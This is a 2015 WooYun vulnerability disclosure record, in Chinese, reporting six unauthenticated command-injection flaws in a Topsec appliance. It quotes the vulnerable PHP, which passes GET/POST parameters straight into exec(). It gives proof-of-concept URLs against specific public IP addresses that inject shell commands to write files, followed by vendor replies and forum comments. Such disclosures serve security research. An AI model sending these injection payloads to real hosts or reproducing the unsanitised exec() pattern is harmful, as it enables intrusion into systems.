{"id": 48337, "wybug_id": "wooyun-2015-0117621", "wybug_title": "天融信某系统前台无需登录命令执行六处", "wybug_corp": "天融信", "wybug_author": "路人甲", "wybug_date": "2015-06-02 11:39", "wybug_open_date": "2015-09-02 17:06", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-02：\t细节向公众公开  简要描述： 天融信某系统前台无需登录命令执行六处 详细说明：  bytecache_run_action.php:\n<?php require_once dirname(__FILE__).\"/../common/commandWrapper.inc\";require_once dirname(__FILE__).\"/../common/UciUtil.inc\";$action = $_GET['action'];$engine = $_GET['engine'];$ipfilter= $_GET['ipfilter'];if($action==\"1\"){\t$ipFilterArray = split(\"[/.]\",$ipfilter);\t\t\t\t\tfor($m =0 ;$m<4 ;$m++){\t\tif($ipFilterArray[$m]>15){\t\t\t$ipFilterArray[$m]=dechex($ipFilterArray[$m]);\t\t}else{\t\t\t$ipFilterArray[$m]=\"0\".dechex($ipFilterArray[$m]);\t\t}\t}\t\t$ipFilterNum =$ipFilterArray[0].$ipFilterArray[1].$ipFilterArray[2].$ipFilterArray[3];\tUciUtil::setValue('appex', 'sys', 'BCDebugEngineId',$engine);\tUciUtil::setValue('appex', 'sys', 'BCDebugIpFilter',$ipfilter);\tstartByteCacheDebug($engine,$ipFilterNum);}else{\t$engine = UciUtil::getValue('appex', 'sys', 'BCDebugEngineId');\tstopByteCacheDebug($engine);}?>\n第一处:setValue跟进去:\npublic static function setValue($package, $config, $option, $value){\t\tself::getUciDao()->set($package, $config, $option, $value);\t}\n再跟进去:\npublic function setConfig($package,$config,$value){\t\t$cmd = UCI_CMD.\" set \".$package.\".\".$config.\"=\".$value;\t\texec($cmd);\t}\n说明value可控第二处：startByteCacheDebug($engine,$ipFilterNum);跟进去:\nfunction startByteCacheDebug($engine,$ipFilter){\t$command = \"/tmp/appexcfg/bin/apxdebug.sh start \".\" \".$engine.\" \".$ipFilter.\" >/dev/null &\";\t\texecute($command);}\n第三处:当action 不是1的时候stopByteCacheDebug($engine);跟进去：\nfunction stopByteCacheDebug($engine){\t$command = \"/tmp/appexcfg/bin/apxdebug.sh stop \".\" \".$engine.\" & \";\t\texecute($command);\t//echo $command;}\n证明一处即可:http://218.206.217.19:8080/acc/debug/bytecache_run_action.php?action=1&engine= | echo wooyun > a.php | &ipfilter=10访问:http://218.206.217.19:8080/acc/debug/a.php第四处：change_lan.php\n$lanID = 'En';\t    $refLink = $_SERVER['HTTP_REFERER'];    if(empty($refLink)){        $refLink = \"/index.php\";    }    $refLink = str_replace(\"?error=1\", \"\", $refLink);    if(array_key_exists('LanID',$_REQUEST))    {        $lanID = $_REQUEST[\"LanID\"];\t\t$appexSystemDao = new AppexSystemDao();\t\t$appexSystemDao->setAppexSystemConfigItemValue(LANGUAGE_ID_FIELD,$lanID);          $appexSystemDao->commit();        session_start();\n跟进setAppexSystemConfigItemValue：\npublic function setAppexSystemConfigItemValue($option,$value){\t\tparent::set(UCI_APPEX,\"sys\",$option,$value);\t}\n再跟进;\npublic function set($package,$config,$option,$value){\t\t$cmd = UCI_CMD.\" set \".$package.\".\".$config.\".\".$option.\"='\".$value.\"'\";\t\texec($cmd);\t}\nhttp://61.148.24.182:8080/change_lan.phppostdata:LanID=1' | echo ' wooyun' > a.php | '\n\n第五处：enable_tool_debug.php：\n<?phprequire_once dirname(__FILE__).\"/../common/commandWrapper.inc\";error_reporting(E_ALL ^ E_WARNING ^ E_NOTICE);$val = $_GET['val'];$tool = $_GET['tool'];$par = $_GET['par'];runTool($val,$tool,$par);?>\nrunTool:\nfunction runTool($val,$tool,$par){\tif($val==\"0\"){\t\tUciUtil::setValue('system', 'runtool', 'tool', $tool);\t\tUciUtil::setValue('system', 'runtool', 'parameter', $par);\t\tUciUtil::commit('system');\t\tif($tool==\"1\"){\t\t\texec('ping '.$par.'>/tmp/tool_result &');\t\t}else if($tool==\"2\"){\t\t\texec('traceroute '.$par.'>/tmp/tool_result &');\t\t}\t}else if($val==\"1\"){\t\t$tool=UciUtil::getValue('system', 'runtool', 'tool');\t\tif($tool==\"1\"){\t\t\texec('killall ping ');\t\t}else if($tool==\"2\"){\t\t\texec('killall traceroute ');\t\t}\t\tUciUtil::setValue('system', 'runtool', 'tool', '');\t\tUciUtil::setValue('system', 'runtool', 'parameter', '');\t\tUciUtil::commit('system');\t\texec('echo \"\">/tmp/tool_result');\t}\nhttp://61.54.222.33:8080/acc/tools/enable_tool_debug.php?val=0&tool=1&par=172.0.0.1' | echo wooyun > a.php | '\n\ngetMacAddr.php:\n<?php include_once dirname(__FILE__).'/../common/commandWrapper.inc';$tmpeth = $_GET['eth'];$tmpmacAddr = strtoupper(getMacAddrFromIfName($tmpeth));echo '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"text\" name=\"mac\" id=\"mac\" value=\"'.$tmpmacAddr.'\" >';?>\n跟进getMacAddrFromIfName\nfunction getMacAddrFromIfName($ifName){\t $mac = execute('cat /sys/class/net/' . trim($ifName) . '/address')->get('output');     if($mac != null && $mac != '')\t\treturn $mac[0];\t else \t\t    return '';\t}\nhttp://218.206.217.19:8080/acc/network/getMacAddr.php?eth= | echo wooyun > c.php | 访问http://218.206.217.19:8080/acc/network/c.php 即可http://61.148.24.182:8080/ http://61.54.222.39:8080/ http://61.148.24.182:8080 http://61.54.222.33:8080   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-06-04 17:05 厂商回复： 已经收到其它网站漏洞报送，谢谢关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-02 11:47 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  眼熟啊    \n     2015-06-02 11:51 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:544 漏洞数:107        | 低调求发展)\t\t \n  bu hou dao    \n     2015-06-02 12:02 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:78        | 就恨自己服务器太少)\t\t \n  这个过毛？    \n     2015-06-02 12:07 |    \t\t北京方便面  \t\t\t( 核心白帽子 |\t\t\t        Rank:876 漏洞数:66        | 我爱吃北京方便面)\t\t \n  别这么说 拿源码看了下 这漏洞还是很容易发现的 一眼就能看出来 谁都可以提交    \n     2015-06-02 13:02 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  TopAPP-WO广域网优化系统？    \n     2015-06-02 13:13 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xfkxfk 看来天融信悲催了    \n     2015-09-02 18:02 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  最近这种通用的怎么都没奖金发啊？没奖金懒得发了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}